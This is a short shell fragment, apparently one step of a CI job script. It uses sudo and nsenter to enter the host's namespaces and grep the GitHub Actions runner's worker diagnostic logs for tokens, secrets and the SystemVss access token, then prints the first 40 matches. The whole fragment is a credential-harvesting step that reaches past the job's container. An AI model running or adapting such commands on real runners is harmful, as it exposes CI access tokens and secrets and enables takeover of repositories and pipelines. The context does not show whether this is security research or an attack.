        echo ""
        echo "--- Step 5: read via nsenter from host perspective ---"
        echo "I18 nsenter _diag Worker log:"
        sudo nsenter -t 1 -m -p -- sh -c 'grep -i "token\|secret\|SystemVss\|AccessToken" /home/runner/actions-runner/cached/_diag/Worker_*.log 2>/dev/null | head -40' 2>&1 || echo "(nsenter failed)"

